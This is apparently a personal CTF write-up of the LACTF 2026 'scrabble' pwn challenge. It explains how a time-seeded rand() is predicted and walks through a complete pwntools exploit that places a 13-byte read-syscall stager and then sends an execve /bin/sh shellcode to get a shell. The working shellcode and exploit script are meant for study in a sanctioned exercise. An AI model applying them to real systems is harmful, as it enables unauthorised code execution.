---
title: "LACTF 2026: scrabble"
date: "2026-02-09"
description: 'Writeup for the "scrabble" Pwn challenge in the LACTF 2026.'
---

# LACTF 2026: scrabble

#### February 9, 2026

This is probably the hardest challenge I've done to date. It's a Pwn challenge that simulates a sort of Scrabble game.

We're given this code:

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sys/mman.h>
#include <unistd.h>

#define HAND_SIZE 14
#define BOARD_ADDR 0x13370000UL
#define BOARD_SIZE 0x1000

void banner() {
    puts("");
    puts("    .=========================================.");
    puts("    |  +---+---+---+---+---+---+---+---+      |");
    puts("    |  | S | c | r | a | b | A | S | M |      |");
    puts("    |  | 1 | 3 | 1 | 1 | 3 | 1 | 1 | 3 |      |");
    puts("    |  +---+---+---+---+---+---+---+---+      |");
    puts("    |                                         |");
    puts("    |   The word game where bytes are tiles   |");
    puts("    |     and the board runs your code!       |");
    puts("    '========================================='");
    puts("");
    printf("    Board: 0x%lx    Tiles: %d\n", BOARD_ADDR, HAND_SIZE);
    puts("");
}

void view_hand(unsigned char *hand) {
    printf("    ");
    for (int i = 0; i < HAND_SIZE; i++) printf("+----");
    puts("+");
    printf("    ");
    for (int i = 0; i < HAND_SIZE; i++) printf("| %02x ", hand[i]);
    puts("|");
    printf("    ");
    for (int i = 0; i < HAND_SIZE; i++) printf("+----");
    puts("+");
    printf("    ");
    for (int i = 0; i < HAND_SIZE; i++) printf(" %2d  ", i);
    puts("");
    puts("");
}

void swap_tile(unsigned char *hand) {
    char line[32];
    printf("    Which tile? (0-%d): ", HAND_SIZE - 1);
    if (!fgets(line, sizeof(line), stdin)) return;
    int idx = atoi(line);
    if (idx < 0 || idx >= HAND_SIZE) {
        puts("    Invalid tile!");
        return;
    }
    hand[idx] = rand() & 0xFF;
    puts("    Tile swapped!");
}

void play(unsigned char *hand) {
    void *board = mmap((void *)BOARD_ADDR, BOARD_SIZE,
                       PROT_READ | PROT_WRITE | PROT_EXEC,
                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (board == MAP_FAILED) {
        perror("    mmap");
        exit(1);
    }

    puts("");
    puts("    Playing your word...");
    puts("    TRIPLE WORD SCORE!");
    puts("");

    memcpy(board, hand, HAND_SIZE);
    ((void (*)(void))board)();
}

int main() {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);

    srand(time(NULL));

    unsigned char hand[HAND_SIZE];
    for (int i = 0; i < HAND_SIZE; i++)
        hand[i] = rand() & 0xFF;

    banner();

    puts("    Your starting tiles:");
    view_hand(hand);

    char line[32];
    while (1) {
        puts("    1) Swap a tile");
        puts("    2) Play!");
        printf("    > ");
        if (!fgets(line, sizeof(line), stdin)) break;
        int choice = atoi(line);
        switch (choice) {
            case 1: swap_tile(hand); break;
            case 2: play(hand); return 0;
            default: puts("    Invalid choice!"); break;
        }
    }

    return 0;
}
```

Like in the [tic-tac-no](lactf-2026-tic-tac-no) challenge, this is a lot of code. Let's look at what happens when we execute the binary:

```
$ ./chall

    .=========================================.
    |  +---+---+---+---+---+---+---+---+      |
    |  | S | c | r | a | b | A | S | M |      |
    |  | 1 | 3 | 1 | 1 | 3 | 1 | 1 | 3 |      |
    |  +---+---+---+---+---+---+---+---+      |
    |                                         |
    |   The word game where bytes are tiles   |
    |     and the board runs your code!       |
    '========================================='

    Board: 0x13370000    Tiles: 14

    Your starting tiles:
    +----+----+----+----+----+----+----+----+----+----+----+----+----+----+
    | d5 | a8 | bd | 42 | dc | f8 | 2b | 17 | 07 | 64 | c8 | 71 | 15 | a5 |
    +----+----+----+----+----+----+----+----+----+----+----+----+----+----+
      0    1    2    3    4    5    6    7    8    9   10   11   12   13  

    1) Swap a tile
    2) Play!
    > 
```

Running the first option opens this menu:

```
	1) Swap a tile
    2) Play!
    > 1
    Which tile? (0-13): 0
    Tile swapped!
    3) Swap a tile
    4) Play!
    > 
```

I actually have never played Scrabble, so I don't know what the rules are, but in this challenge the tile you select will randomly change to a different byte.

Now let's check the "Play" option:

```
    1) Swap a tile
    2) Play!
    > 2

    Playing your word...
    TRIPLE WORD SCORE!

[1]    65726 illegal hardware instruction  ./chall
```

Interesting! From the looks of it, it seems like this program executes the board we created as instructions! That's quite important, because the program itself is giving us the possibility of executing an array we have writing permissions on. The issue is quite apparent, though. We don't really have full control of the bytes, because when we want to swap a specific tile, the value of it is randomized. We can see this in the `swap_tile` function:

```
void swap_tile(unsigned char *hand) {
    char line[32];
    printf("    Which tile? (0-%d): ", HAND_SIZE - 1);
    if (!fgets(line, sizeof(line), stdin)) return;
    int idx = atoi(line);
    if (idx < 0 || idx >= HAND_SIZE) {
        puts("    Invalid tile!");
        return;
    }
    hand[idx] = rand() & 0xFF;
    puts("    Tile swapped!");
}
```

Let's also check the `play` function. It's quite important because it's what will execute our "shellcode":

```
void play(unsigned char *hand) {
    void *board = mmap((void *)BOARD_ADDR, BOARD_SIZE,
                       PROT_READ | PROT_WRITE | PROT_EXEC,
                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (board == MAP_FAILED) {
        perror("    mmap");
        exit(1);
    }

    puts("");
    puts("    Playing your word...");
    puts("    TRIPLE WORD SCORE!");
    puts("");

    memcpy(board, hand, HAND_SIZE);
    ((void (*)(void))board)();
}
```

Here we confirm our suspicion that the board does get executed. First, with `mmap`, we map a region in memory that has execution permissions. Checking `BOARD_SIZE`, the size of this region is `0x1000`. Any instruction we somehow move in here will be able to be executed.

Then, the actual Scrabble bytes in the hand get copied into the region. However, only `HAND_SIZE` bytes get copied, 14. This means that the mapped region is actually much bigger than the content the program copies into it. This will be important later on. A important roadblock is that the region we have control over is actually only 14 bytes long, not nearly enough for a `/bin/sh` or `cat /flag` shellcode.

Anyhow, there's a bigger issue on our hands. We're not even able to create a hand with arbitrary values, because the values we swap into it are random. Let's see how we can tackle this issue:
## Defeating randomness

It's quite easy to just drop the vulnerability and how to exploit it, but this took hours for me. I focused a lot on the way inputs were treated, thinking an overflow lied somewhere. It wasn't it. The point I'm making is that most of the time, finding the vulnerability is much more time-consuming than finding out a way to exploit it. So yeah. This took quite a while.

The vulnerability of this challenge lies in the way the numbers are generated. Let's see some code:

```
srand(time(NULL));

unsigned char hand[HAND_SIZE];
for (int i = 0; i < HAND_SIZE; i++)
    hand[i] = rand() & 0xFF;
```

This is one part of `main`. `srand` defines the seed of the program. When you give it `time(NULL)` you're using your current UNIX timestamp as a seed. It is common practice, because the seed changes every second you execute it, which means you'll get a different sequence of numbers every different second in which you execute the program. It is also a practice that leads to a vulnerability.

In C, the numbers generated by `rand` aren't actually random. You give it a seed, and the algorithm it uses will generate a sequence of deterministic numbers. They *will* feel random, but the same seed will always generate the same numbers. This means that, if we know the seed one process uses, we will be able to completely predict the numbers that process will generate. Since we know that the seed used is the UNIX timestamp of the second in which the program is executed, we actually can predict the bytes the program will generate! Let's test this out with a simple script:

```
import random
import time
from pwn import *
import ctypes

p = process("./chall")
libc = ctypes.CDLL("libc.so.6")

seed = int(time.time())
libc.srand(seed)

print("Bytes that will be generated")
for _ in range(14):
    print(hex(libc.rand() & 0xff))
    
p.interactive()
```

This script will create a process that runs the challenge binary. It will also use `ctypes` to load `libc` into the Python script so we can use the very same `rand` in it. As you can see, we set the current UNIX timestamp as the seed. This is the very same seed the Scrabble program will have, because it will be executed on the very same second we execute the Python script. And since we use the same algorithm in both sides, we can generate in the script the next 14 numbers (as we do in the for loop) the program will generate. These numbers will be the same that will be generated in the challenge program. Then, I call `p.interactive()` to see the output of the program and verify that we do know the numbers. Let's see it in action:

```
$ python3 seedtest.py
[+] Starting local process './chall': pid 87175
Bytes that will be generated
0x1
0xb5
0xba
0xdd
0x26
0x4c
0x1c
0x3b
0x90
0x14
0x16
0x86
0xba
0x97
[*] Switching to interactive mode

    .=========================================.
    |  +---+---+---+---+---+---+---+---+      |
    |  | S | c | r | a | b | A | S | M |      |
    |  | 1 | 3 | 1 | 1 | 3 | 1 | 1 | 3 |      |
    |  +---+---+---+---+---+---+---+---+      |
    |                                         |
    |   The word game where bytes are tiles   |
    |     and the board runs your code!       |
    '========================================='

    Board: 0x13370000    Tiles: 14

    Your starting tiles:
    +----+----+----+----+----+----+----+----+----+----+----+----+----+----+
    | 01 | b5 | ba | dd | 26 | 4c | 1c | 3b | 90 | 14 | 16 | 86 | ba | 97 |
    +----+----+----+----+----+----+----+----+----+----+----+----+----+----+
      0    1    2    3    4    5    6    7    8    9   10   11   12   13  

    1) Swap a tile
    2) Play!
    > $  
```

Sure enough! We were able to predict the bytes the challenge would generate! We predicted 14 numbers, but why stop there? We can predict any next number that will be generated.

So here is how we can use this to our advantage: we've mentioned before how we can only swap random numbers into our Scrabble hand. Now this is not an issue anymore. Since we know the sequence the program will use, we have the upper hand. We can just keep generating numbers until one we want appears. This can be bruteforced pretty easily!

```
count = 0
desired_number = 0xAE
number = -1
while (number != desired_number):
	number = libc.rand() & 0xff
	count += 1
```

With this loop, we'll increment the variable `count` for every generated number that isn't the desired number we want. In this case, `0xAE`. Now, if we execute "Swap a tile" that same number of times, we'll have the desired byte we want!

```
for _ in range(count):
	p.sendlineafter(b">", b"1") # We choose the swap option
	p.sendlineafter(b"(0-13): ", b"3") # We choose tile 3
```

Let's create a function for this and add it to our script:

```
def bruteforce_byte(desired_num, tile_index):
    # Gets the amount of times we'll have to generate
    # numbers before we get desired_num
    num = -1
    numbers_generated = 0
    while (num != desired_num):
        num = libc.rand() & 0xFF
        numbers_generated += 1

    # Interacts with the binary the necessary number
    # of times to generate it in the desired tile_index.
    for _ in range(numbers_generated):
        p.sendlineafter(b">", b"1")
        p.sendlineafter(b"Which tile? (0-13): ", str(tile_index).encode())
```

Great! Now we have arbitrary control on every tile of the hand. This is a lot of progress, coming from a program that initially only allowed us to generate random numbers. With this in mind, it's time to think about the shellcode. 
## The shellcode

While I was still finding out how to write arbitrary values to the Scrabble hand, our team and I were worried about how little the potential shellcode was going to be. 14 bytes isn't much, and if you don't play your cards right, you can barely fit any instruction in them. A lot of ideas came to mind to work around this. Building a ROP chain, somehow perform a ret2libc exploit, calling already executed functions with the hopes of finding a bug that would give us more freedom... most of these ideas weren't feasible because ASLR is activated in the binary. At some point, I was convinced that I was missing a buffer overflow somewhere. Coincidentally, the binary doesn't have a stack canary. Still, I found nothing.

Then I started thinking. Something I haven't mentioned yet is that the hand gets mapped into a fixed address, `0x13370000`. I thought that this was for a reason. So I began thinking about more creative ways to expand our shellcode. The first idea that came to mind had to do with `memcpy`. Inspired by the way the hand was copied into the mapped region, I thought I could do something similar: copying a useful snippet of code somewhere into `0x13370000+14`, to continue the shellcode. This wasn't feasible either because of ASLR, so I even thought about copying values there directly, but that just moved the problem elsewhere.

The solution was less quirky. Instead of looking for useful code in the binary, why don't I generate it myself? Sure, I can't do it with the binary code itself, but can I fit a `read` syscall shellcode in 14 bytes so you can input through `stdin` as much data as I want? This would fix the 14 bytes issue. Since the mapped address is fixed, I can just read as much input as I can from `stdin` (where I don't have the 14-byte restriction) and store the input in `0x1337000E`, right next to the Scrabble shellcode. There, I could inject the actual shellcode that would give me access to the flag, because I'd save space for it. Well, it turns out that you can, and with only 13 bytes too!

```
.global _start
_start:
.intel_syntax noprefix
	xor eax, eax # eax = 0 (read syscall code)
	xor edi, edi # rdi = 0 (uses file descriptor 0 (stdin))
	mov esi, 0x1337000e # esi = 0x1337000e (Address after our shellcode)
	mov dl, 255 # rdx = 255 (Reads 255 bytes)
	nop # Reminding byte, not needed :)
	syscall
```

This assembly code sets up a `read` syscall, that reads 255 bytes in `stdin` and stores them in `0x1337000E`.  This expands our shellcode 255 more bytes. That's more than enough space to fit a `/bin/sh` shellcode. When the `read` shellcode gets executed, `stdin` will be opened. In there, we'll write a `/bin/sh` shellcode. Since it will be copied right after the last instruction of the shellcode, it will be executed as if it was just more code. Ideally, this should grant us access to a shell in which we can `cat` the flag.

Let's turn this assembly code into a proper shellcode. The instruction bytes, that is. There's two commands we need for this:

```
$ gcc -nostdlib -static read_shellcode.s -o read_shellcode-elf
$ objcopy --dump-section .text=read_shellcode-raw read_shellcode-elf
```

This will compile the assembly and then extract the `.text`  section, which contains the raw bytes of the instructions, nothing more. This will be in `read_shellcode-raw`. Let's check the hexdump:

```
$ xxd read_shellcode-raw
00000000: 31c0 31ff be0e 0037 13b2 ff90 0f05       1.1....7......
```

These are the bytes that will need to be in the Scrabble hand. We can add them with the function we made before:

```
bruteforce_byte(0x31, 0)
bruteforce_byte(0xc0, 1)
bruteforce_byte(0x31, 2)
bruteforce_byte(0xff, 3)
bruteforce_byte(0xbe, 4)
bruteforce_byte(0x0e, 5)
bruteforce_byte(0x00, 6)
bruteforce_byte(0x37, 7)
bruteforce_byte(0x13, 8)
bruteforce_byte(0xb2, 9)
bruteforce_byte(0xff, 10)
bruteforce_byte(0x90, 11)
bruteforce_byte(0x0f, 12)
bruteforce_byte(0x05, 13)
```

Now, instead of opening the binary as a simple process, I'll open it in a GDB instance to showcase that this does indeed work:

```
p = gdb.debug(elf.path, gdbscript="""
break *play+173
continue""")
```

I took the liberty to add a breakpoint in `play`, right before executing the shellcode. Now let's run it:

```
$ python3 solve.py
pwndbg> x/14bx 0x13370000
0x13370000:     0x31    0xc0    0x31    0xff    0xbe    0x0e    0x00    0x37
0x13370008:     0x13    0xb2    0xff    0x90    0x0f    0x05
```

Great! The shellcode's all set up. We can even check that the instructions are actually correct:

```
pwndbg> x/6i 0x13370000
0x13370000:  xor    eax,eax
0x13370002:  xor    edi,edi
0x13370004:  mov    esi,0x1337000e
0x13370009:  mov    dl,0xff
0x1337000b:  nop
0x1337000c:  syscall
```

We're almost done, now we just need to add a `p.send()` call to move the `/bin/sh` shellcode to the mapped memory. But first, let's build it in assembly:

```
.global _start
_start:
.intel_syntax noprefix
	xor rsi,rsi
	push rsi
	mov rdi,0x68732f2f6e69622f
	push rdi
	push rsp
	pop rdi
	push 59
	pop rax
	cdq
	syscall
```

I didn't even bother to make this one myself. There's so many `/bin/sh` shellcodes online that you don't really have much to worry about. This shellcode uses the stack to run an `execve` syscall that runs `/bin/sh`, essentially opening a shell. Just like with the other shellcode, we compile it and extract the `.text` section:

```
$ gcc -nostdlib -static execve_shellcode.s -o execve_shellcode-elf
$ objcopy --dump-section .text=execve_shellcode-raw execve_shellcode-elf
```

Since this shellcode is longer, I'll just open `execve_shellcode-raw` as a binary file in the Python script and read it there:

```
execve_shellcode = open("execve_shellcode-raw", "rb").read()
```

Now we can send it to the process after executing the "Play" option. This is the last thing we need to add to the script, so I'll paste the whole thing:

```
import random
import time
from pwn import *
import ctypes


def bruteforce_byte(desired_num, tile_index):
    # Gets the amount of times we'll have to generate numbers before we get desired_num
    num = -1
    numbers_generated = 0
    while (num != desired_num):
        num = libc.rand() & 0xFF
        numbers_generated += 1

    # Interacts with the binary the necessary number of times to generate it in the desired tile_index.
    for _ in range(numbers_generated):
        p.sendlineafter(b">", b"1")
        p.sendlineafter(b"Which tile? (0-13): ", str(tile_index).encode())


# Opens the remote connection
p = remote("127.0.0.1", 5000)

# Loads libc into the script
libc = ctypes.CDLL("libc.so.6")
seed = int(time.time())
libc.srand(seed)

# Generates the first 14 bytes of the binary (the initial Scrabble hand)
for _ in range(14):
    libc.rand() & 0xFF 

# Generates the read shellcode
bruteforce_byte(0x31, 0)
bruteforce_byte(0xc0, 1)
bruteforce_byte(0x31, 2)
bruteforce_byte(0xff, 3)
bruteforce_byte(0xbe, 4)
bruteforce_byte(0x0e, 5)
bruteforce_byte(0x00, 6)
bruteforce_byte(0x37, 7)
bruteforce_byte(0x13, 8)
bruteforce_byte(0xb2, 9)
bruteforce_byte(0xff, 10)
bruteforce_byte(0x90, 11)
bruteforce_byte(0x0f, 12)
bruteforce_byte(0x05, 13)

# Executes the generated shellcode
p.sendlineafter(b">", b"2")

# Sends the execve shellcode to the read shellcode, expanding our payload
shellcode2 = open("shellcode-2-raw", "rb").read()
p.send(shellcode2)
p.interactive() # We set the interactive mode to be able to interact with the shell
```

Notice how now I open a remote connection to a port in localhost. This is the docker file that the challenge gave us. I connect to this because the CTF is over as of the time I'm writing this. I also did not beat this in time. Nevertheless, the docker instance works as a showcase that this exploit works:

```
$ python3 solve.py
[+] Opening connection to 127.0.0.1 on port 5000: Done
[*] Switching to interactive mode

	Playing your word...
	TRIPLE WORD SCORE!
	
$ ls 
flag.txt
run
$ cat flag.txt
lactf{flag}
$
```

That should be enough for us to get the flag!

As I've mentioned in the beginning, this might just be the hardest Pwn challenge I've beaten. It took me several hours, and quite frankly, I wasn't sure at all I was going to beat it before giving up. I'm quite proud I did though!